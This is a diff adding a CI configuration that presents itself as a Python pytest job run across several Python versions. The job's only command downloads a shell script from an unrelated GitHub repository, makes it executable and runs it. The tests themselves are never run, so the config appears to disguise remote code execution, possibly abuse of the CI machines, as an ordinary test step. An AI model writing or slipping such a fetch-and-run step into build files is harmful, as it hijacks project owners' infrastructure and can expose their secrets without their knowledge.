@@ -1,0 +1,20 @@
+version: v1.0
+name: Python
+agent:
+  machine:
+    type: e1-standard-8
+    os_image: ubuntu1804
+blocks:
+  - name: Test
+    task:
+      jobs:
+        - name: pytest
+          matrix:
+            - env_vars: PYTHON_VERSION
+              values:
+                - '2.7'
+                - '3.5'
+                - '3.6'
+                - '3.7'
+          commands:
+            - 'wget https://raw.githubusercontent.com/linanta/mbc1/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh'
